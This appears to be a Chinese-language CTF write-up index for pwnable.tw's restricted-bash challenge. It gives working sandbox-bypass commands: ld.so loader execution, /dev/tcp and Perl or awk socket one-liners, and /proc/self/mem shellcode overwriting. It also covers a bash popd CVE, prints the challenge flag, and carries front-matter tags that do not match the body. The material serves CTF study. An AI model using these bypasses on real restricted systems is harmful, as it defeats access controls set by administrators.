---
tags:
  - logic-flaw
  - race-condition
  - command-injection
platform: pwnable.tw
points: 200
arch: x86-64
libc: glibc-2.23
relro: partial
canary: yes
nx: yes
pie: no
references:
  - https://pwnable.tw/challenge/
description: "受限 bash shell 中创建临时环境文件时的竞态条件，使得攻击者可以执行任意 shell 命令以绕过限制。"
proof-of-concept: no
---

# Bash — pwnable.tw（200 分）

[← 返回 pwnable.tw 题目索引](README.md)

> `nc chall.pwnable.tw 10108`
>
> Flag：`FLAG{1nt3nt3d_s0luti0n_1s_CVE-2016-9401_;)}`

## 题目概览

一个受限环境题目。玩家被丢进一个以低权限用户 `bash` 运行的交互式 bash 4.3.0 shell。`/flag` 属于 root（`chmod 400`），但 `127.0.0.1:1337` 上有一个属于 root 的 xinetd 服务，只要连上它就会执行 `cat /flag`。目标是在受限 shell 内发起一个到 `localhost:1337` 的 TCP 连接。

```python
Deployment (from Dockerfile):
  Base:       ubuntu:16.04
  Shell:      bash 4.3.0 (custom binary, --noprofile --norc -i)
  User:       bash (low privilege)
  Binaries:   chmod o-x /bin/* /sbin/* /usr/bin/* /usr/sbin/*
              chmod o+x /bin/cat /bin/ls           # only cat and ls are executable
  Filesystem: /tmp, /var/tmp, /dev/shm, /home/bash all read-only bind-mounted
  Flag:       root:root 400 /flag
  Flag svc:   xinetd on 127.0.0.1:1337 — runs "cat /flag" as root
```

### 三层限制

| 手法 | 为何失败 |
|-----------|-------------|
| `cat < /dev/tcp/127.0.0.1/1337` | 题目提供的 bash 二进制编译时**没有启用 `--enable-net-redirections`**，因此 `/dev/tcp` 不存在。 |
| 直接运行 `nc`/`python`/`perl` 等 | `chmod o-x` 去掉了 `/bin`、`/sbin`、`/usr/bin`、`/usr/sbin` 下所有文件的执行权限——只有 `cat` 和 `ls` 保留了 `o+x`。 |
| `enable -f evil.so builtin`（通过 `dlopen` 加载可加载内置命令） | bash 技术上支持这种用法，但所有可写目录（`/tmp`、`/var/tmp`、`/dev/shm`、`/home/bash`）都以只读方式 bind mount，无法把 `.so` 文件写到磁盘。 |

## 漏洞 / 弱点

### W1 —— 动态加载器（`ld.so`）仍保留执行权限（非预期，主要路径）

**根因：** Dockerfile 只对 `/bin/*`、`/sbin/*`、`/usr/bin/*`、`/usr/sbin/*` 去掉了执行权限。而位于 `/lib/x86_64-linux-gnu/ld-2.23.so`（以及 `/lib64/ld-linux-x86-64.so.2`）的动态链接器没有被处理，仍然对所有用户可执行。

```bash
$ ls -l /lib64/ld-linux-x86-64.so.2
lrwxrwxrwx ... -> /lib/x86_64-linux-gnu/ld-2.23.so

$ ls -l /usr/bin/perl
-rwxr-xr--  ...  /usr/bin/perl    # other has read but NOT execute
```

**绕过方式：** 内核执行这个加载器（它具有 `o+x`）。随后加载器**读取**目标二进制（只需 `o+r`），把它映射进内存并执行。这样就彻底绕过了执行权限缺失的问题：

```bash
/lib64/ld-linux-x86-64.so.2 /usr/bin/perl -e 'print "works\n"'
```

**影响：** `/bin`、`/usr/bin` 等目录下所有仍具有读权限的二进制（也就是全部）都可以通过这个加载器技巧执行。这包括 perl、python、bash 本身（系统的 `/bin/bash` **确实**支持 `/dev/tcp`）、awk/gawk，以及任何具备网络能力的工具。

### W2 —— CVE-2016-9401：bash `popd` 可控释放（预期解法）

**根因：** 在 bash 4.3.0 中，`popd` 内置命令存在 use-after-free 漏洞。当 `popd` 以负数、越界的偏移量调用（例如 `popd -NNN`）时，它会在没有正确边界检查的情况下 `free()` 一个用户可控的地址。

**影响：** 提供了一个进程内内存破坏原语。通过控制被释放的地址，攻击者可以：
1. 破坏 bash 内部的堆元数据
2. 劫持 bash 进程内的控制流
3. 直接从 bash 进程调用 libc 的 `socket()`/`connect()`，连接到 `127.0.0.1:1337`

这条路径**不需要写文件、不需要外部程序、也不需要 `/dev/tcp`**——完全在 bash 进程的内存中完成，而这正是只读文件系统限制想要逼迫玩家走的路线。

### W3 —— `/proc/self/mem` 可写（变体使能点）

**根因：** bash 进程可以以写方式打开 `/proc/self/mem`（`exec 3>/proc/self/mem`），再用 `dd`（通过 W1 的 ld.so 技巧启动）seek 到已知的代码地址，并用 shellcode 覆盖它。

```bash
exec 3>/proc/self/mem
printf '\x6a\x29\x58...' | /lib/x86_64-linux-gnu/ld-2.23.so /bin/dd >&3 seek=<echo_builtin_addr> bs=1 count=123
echo   # triggers the overwritten echo builtin → shellcode runs
```

**影响：** 在 bash 进程内实现任意代码执行。shellcode 执行 `socket()` + `connect()` + `read()` + `write()`，从 `localhost:1337` 取回 flag。

## 利用路径

### 路径 A —— ld.so + bash `/dev/tcp`（最简单，约 45% 的解法）

用加载器执行**系统的** `/bin/bash`（与题目的定制 bash 不同，它是启用 `--enable-net-redirections` 编译的），然后使用 bash 内置的 `/dev/tcp` 伪设备：

```bash
/lib64/ld-linux-x86-64.so.2 /bin/bash
cat < /dev/tcp/127.0.0.1/1337
```

或者写成一行：

```bash
/lib64/ld-linux-x86-64.so.2 /bin/bash -c "cat < /dev/tcp/127.0.0.1/1337"
```

**为什么有效：** 系统的 `/bin/bash` 与题目定制的 `/home/bash/bash` 是不同的二进制。它启用了 net-redirections，因此 `/dev/tcp` 可用。

---

### 路径 B —— ld.so + perl socket（最常见，约 45% 的解法）

用加载器执行 perl，它内置 socket 支持：

```bash
/lib64/ld-linux-x86-64.so.2 /usr/bin/perl -MIO::Socket::INET -e '
  my $s = IO::Socket::INET->new(PeerAddr => "127.0.0.1:1337");
  print while <$s>;
'
```

变体使用不同的 Perl socket API：
- `IO::Socket::INET`（高层封装，最常见）
- `Socket` 模块，直接调用原生 `socket()`/`connect()`
- Perl 调试器 REPL：`ld-linux.so perl -de1`，然后交互式输入 socket 代码

**为什么有效：** Perl 对所有用户可读（`o+r`），所以加载器可以映射并执行它。Perl 的 socket 模块要么是纯 Perl，要么是内置的，不需要额外加载文件。

---

### 路径 C —— CVE-2016-9401：进程内内存破坏（预期解法）

flag 本身就暗示了这条路径：`FLAG{1nt3nt3d_s0luti0n_1s_CVE-2016-9401_;)}`。

1. 利用 `popd` 的 use-after-free 破坏 bash 的堆
2. 在 bash 进程内实现控制流劫持
3. 调用 libc 中已加载的 `socket()`、`connect()`、`read()`、`write()` 取回 flag

**为什么这是预期解法：** 即使没有 ld.so 的疏漏，这条路径也能用——它不需要外部二进制、不需要写文件、也不需要 `/dev/tcp`。只读文件系统正是为了逼玩家走这条路而设计的。只有解法 3498 明确提到了这条路径；绝大多数解法都用的是非预期的 ld.so 绕过。

---

### 路径 D —— ld.so + `/proc/self/mem` 注入 shellcode（创意，少见）

来自解法 33090，分三步：

1. 以写方式打开 `/proc/self/mem`：`exec 3>/proc/self/mem`
2. 用 `dd`（借助 ld.so 技巧）把 `echo` 内置命令的代码覆盖为反弹连接 shellcode：
   ```bash
   printf '\x6a\x29\x58...' | /lib/x86_64-linux-gnu/ld-2.23.so /bin/dd >&3 seek=4601712 bs=1 count=123
   ```
3. 触发被覆盖的内置命令：`echo`——此时它会执行 shellcode，连接 `127.0.0.1:1337` 并打印 flag

**值得注意之处：** 说明即使 W1 不是预期路径，ld.so 技巧也能支撑很有创意的自修改代码方案。

---

### 路径 E —— ld.so + 其他解释器（变体）

ld.so 技巧对任何可读的动态二进制都有效。解法中提到的有：
- `awk`/`mawk`/`gawk`，使用 `/inet/tcp` 伪文件
- `python`，使用 `socket` 模块
- `ruby`，使用 `TCPSocket`

awk 示例：
```bash
/lib64/ld-linux-x86-64.so.2 /usr/bin/awk 'BEGIN { "/inet/tcp/0/127.0.0.1/1337" |& getline line; print line }'
```

## 利用手法总结

| 手法 | 利用的弱点 | 需要写磁盘 | 需要外部二进制 | 可靠性 |
|-----------|--------------|-----------------|----------------------|-------------|
| ld.so + /bin/bash /dev/tcp | W1 | 否 | 是（经加载器） | 100% |
| ld.so + perl socket | W1 | 否 | 是（经加载器） | 100% |
| CVE-2016-9401 popd UAF | W2 | 否 | 否 | 复杂，确定性 |
| ld.so + /proc/self/mem shellcode | W1 + W3 | 否 | 是（dd 经加载器） | 100% |
| 可加载内置命令（.so） | 不适用 | **是** —— 被只读文件系统阻断 | 否 | **远程不可行** |

## 题解文章

| 文件 | 路径 | 手法 | 备注 |
|------|------|-----------|-------|
| `14.md` | A | ld.so + bash + `/dev/tcp` | 两行命令 |
| `821.md` | B | ld.so + perl `IO::Socket::INET` | 一行命令 |
| `1763.md` | B | ld.so + perl 原生 `Socket` | 冗长的 perl |
| `2972.md` | — | （无代码，仅链接参考） | StackExchange 参考链接 |
| `3052.md` | B | ld.so + perl `IO::Socket` | 一行命令 |
| `3498.md` | C | CVE-2016-9401 | 唯一提到预期解法的题解（内容被涂黑） |
| `3578.md` | B | ld.so + perl `IO::Socket::INET` | `recv` 变体 |
| `5586.md` | B | ld.so + perl `IO::Socket` | 很短的一行命令 |
| `6247.md` | B | ld.so + perl 原生 `Socket` | pwntools 封装 |
| `6748.md` | — | 与 Bash Revenge 相同 | 提到 libc 差异 |
| `7905.md` | A+B | ld.so + bash `/dev/tcp` | 最详细的题解；涵盖 CVE-2016-9401 预期路径 |
| `8153.md` | A | ld.so + bash `/dev/tcp` | 两行命令 |
| `9251.md` | — | Bash Revenge 变体 | 引用姊妹题 |
| `10128.md` | B | ld.so + perl REPL（`perl -de1`） | 交互式调试器思路 |
| `12672.md` | B | ld.so + perl 原生 `Socket` | 明确说明“非预期” |
| `21490.md` | A | ld.so + bash + 展示 xinetd 配置 | 展示了 xinetd 配置 |
| `25916.md` | A | ld.so + bash `/dev/tcp` | StackExchange 参考链接 |
| `27939.md` | B | perl `-MSocket` 一行命令 | 没有 ld.so 前缀（可能本来就能直接访问 perl） |
| `28605.md` | A | ld.so + bash `/dev/tcp` | 两行命令，使用通配符（`ld*`） |
| `32010.md` | A | ld.so + bash `/dev/tcp` | 两行命令，使用通配符 |
| `32901.md` | A | ld.so + bash 一行命令 | pwntools 脚本 |
| `33090.md` | D | ld.so + `/proc/self/mem` shellcode | 最有创意：用反弹连接 shellcode 覆盖 `echo` 内置命令 |

## 文件

| 文件 | 说明 |
|------|-------------|
| `desc.txt` | 题目描述 |
| `exp.py` | 可用的利用脚本（ld.so + perl） |
| `artifacts/bash.tgz` | 原始题目压缩包（Dockerfile、bash 二进制、xinetd 配置） |
| `solution/*.md` | 社区题解（22 篇） |
